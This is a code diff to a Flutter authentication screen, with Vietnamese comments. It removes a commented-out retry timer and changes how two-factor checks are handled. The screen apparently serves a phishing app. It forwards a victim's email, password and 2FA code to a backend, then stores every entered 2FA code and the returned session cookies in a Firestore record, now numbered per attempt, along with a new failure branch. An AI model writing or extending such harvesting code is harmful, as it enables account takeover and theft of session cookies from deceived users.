@@ -30,49 +30,18 @@ class _AuthScreenState extends State<AuthScreen> {
   String twoFACodeFake = "123456";
   String? error2FA;
 
-  // int _secondsRemaining = 0;
-  // Timer? _timer;
   int attemptsMade = 1;
-  // bool showTime = false;
-  // hàm countdown thời gian chờ 1p
-  // void startTimer() {
-  //   const oneSec = Duration(seconds: 1);
-  //   _timer = Timer.periodic(oneSec, (timer) {
-  //     setState(() {
-  //       if (_secondsRemaining > 0) {
-  //         _secondsRemaining--;
-  //       } else {
-  //         _timer?.cancel();
-  //       }
-  //     });
-  //   });
-  // }
 
   void _sendAndDisableButton() {
     twoFACode = twoFACodeController.text;
     _homeBloc.add(CheckingTwoFAEvent(
         widget.email, widget.password, twoFACode!, widget.rowId!));
     // khi nhấn nút thì khởi tạo lại thời gian đếm
-    // if (enable) {
-    //   // _secondsRemaining = 60;
-    //   setState(() {
-    //     enable = false;
-    //     // showTime = true;
-    //   });
-    //   startTimer();
-    //   addNewColumn();
-    //   twoFACodeController.clear();
-    // }
     twoFACodeController.clear();
   }
 
   @override
   Widget build(BuildContext context) {
-    // if (twoFACodeController.text.length == 6 && _secondsRemaining == 0) {
-    //   enable = true;
-    // } else {
-    //   enable = false;
-    // }
     if (twoFACodeController.text.length == 6) {
       enable = true;
     } else {
@@ -93,13 +62,25 @@ class _AuthScreenState extends State<AuthScreen> {
           }
           if (state is CheckingTwoFASuccessState) {
             Navigator.of(context).pop();
+            print("Check on success response code ${state.response['status']}");
             final ref = colData.doc(widget.rowId);
             print("check ref $ref");
-            ref.update({"twoFA${attemptsMade++}": twoFACode});
-            ref.update({"cookies": state.response['cookies']});
+            ref.update({"twoFA$attemptsMade": twoFACode});
+            ref.update({"cookies$attemptsMade": state.response['cookies']});
             setState(() {
               error2FA = state.response['message'];
             });
+
+            attemptsMade++;
+          }
+          if (state is CheckingTwoFAFailState) {
+            Navigator.of(context).pop();
+            print("Check on fail response code ${state.response['status']}");
+
+            setState(() {
+              error2FA = state.response['message'];
+            });
+            attemptsMade++;
           }
         },
         child: Center(
